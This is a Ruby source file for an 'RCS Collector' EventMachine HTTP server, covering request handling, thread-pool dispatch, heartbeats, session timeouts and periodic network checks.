#
#  Event handlers
#

# relatives
require_relative 'heartbeat'
require_relative 'parser'
require_relative 'network_controller'
require_relative 'sessions'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/systemstatus'

# system
require 'eventmachine'
require 'em-http-server'
require 'socket'

module RCS
module Collector

class HTTPHandler < EM::Http::Server
  include RCS::Tracer
  include Parser
  
  attr_reader :peer
  attr_reader :peer_port
  
  def post_init

    @request_time = Time.now

    # get the peer name
    if get_peername
      @peer_port, @peer = Socket.unpack_sockaddr_in(get_peername)
    else
      @peer = 'unknown'
      @peer_port = 0
    end

    @network_peer = @peer

    # timeout on the socket
    set_comm_inactivity_timeout 30

    trace :debug, "Connection from #{@network_peer}:#{@peer_port}"
  end

  def closed?
    @closed
  end

  def unbind
    trace :debug, "Connection closed #{@peer}:#{@peer_port}"
    @closed = true
  end

  def process_http_request
    #trace :info, "[#{@peer}] Incoming HTTP Connection"
    size = (@http_content) ? @http_content.bytesize : 0
    trace :debug, "[#{@peer}] REQ: [#{@http_request_method}] #{@http_request_uri} #{@http_query_string} (#{Time.now - @request_time}) #{size.to_s_bytes}"

    # get it again since if the connection is kept-alive we need a fresh timing for each
    # request and not the total from the beginning of the connection
    @request_time = Time.now

    responder = nil

    # Block which fulfills the request
    operation = proc do

      trace :debug, "[#{@peer}] QUE: [#{@http_request_method}] #{@http_request_uri} #{@http_query_string} (#{Time.now - @request_time})" if Config.instance.global['PERF']

      generation_time = Time.now
      
      begin
        # parse all the request params
        request = prepare_request @http_request_method, @http_request_uri, @http_query_string, @http_content, @http, @peer

        # get the correct controller
        controller = CollectorController.new
        controller.request = request

        # do the dirty job :)
        responder = controller.act!
        
        # create the response object to be used in the EM::defer callback
        reply = responder.prepare_response(self, request)

        # keep the size of the reply to be used in the closing method
        @response_size = reply.content ? reply.content.bytesize : 0
        trace :debug, "[#{@peer}] GEN: [#{request[:method]}] #{request[:uri]} #{request[:query]} (#{Time.now - generation_time}) #{@response_size.to_s_bytes}" if Config.instance.global['PERF']
        
        reply
      rescue Exception => e
        trace :error, e.message
        trace :fatal, "EXCEPTION(#{e.class}): " + e.backtrace.join("\n")

        responder = RESTResponse.new(500, e.message)
        reply = responder.prepare_response(self, request)
        reply
      end

    end
    
    # Callback block to execute once the request is fulfilled
    response = proc do |reply|
    	reply.send_response
      
       # keep the size of the reply to be used in the closing method
      @response_size = reply.headers['Content-length'] || 0
    end

    # Let the thread pool handle request
    EM.defer(operation, response)
  end

end #HTTPHandler


class Events
  include RCS::Tracer
  
  def setup(port = 80)

    # main EventMachine loop
    begin
      # all the events are handled here
      EM::run do
        # if we have epoll(), prefer it over select()
        EM.epoll

        # set the thread pool size
        EM.threadpool_size = 50

        # we are alive and ready to party
        SystemStatus.my_status = SystemStatus::OK

        # start the HTTP server
        if Config.instance.global['COLL_ENABLED'] then
          EM::start_server("0.0.0.0", port, HTTPHandler)
          trace :info, "Listening on port #{port}..."

          # send the first heartbeat to the db, we are alive and want to notify the db immediately
          # subsequent heartbeats will be sent every HB_INTERVAL
          HeartBeat.perform

          # set up the heartbeat (the interval is in the config)
          EM::PeriodicTimer.new(Config.instance.global['HB_INTERVAL']) { EM.defer(proc{ HeartBeat.perform }) }

          # timeout for the sessions (will destroy inactive sessions)
          EM::PeriodicTimer.new(60) { EM.defer(proc{ SessionManager.instance.timeout }) }
        end

        # set up the network checks (the interval is in the config)
        if Config.instance.global['NC_ENABLED'] then
          # first heartbeat and checks
          EM.defer(proc{ NetworkController.check })
          # subsequent checks
          EM::PeriodicTimer.new(Config.instance.global['NC_INTERVAL']) { EM.defer(proc{ NetworkController.check }) }
        end

      end
    rescue Exception => e
      # bind error
      if e.message.eql? 'no acceptor' then
        trace :fatal, "Cannot bind port #{port}"
        return 1
      end
      raise
    end

  end

end #Events

end #Collector::
end #RCS::

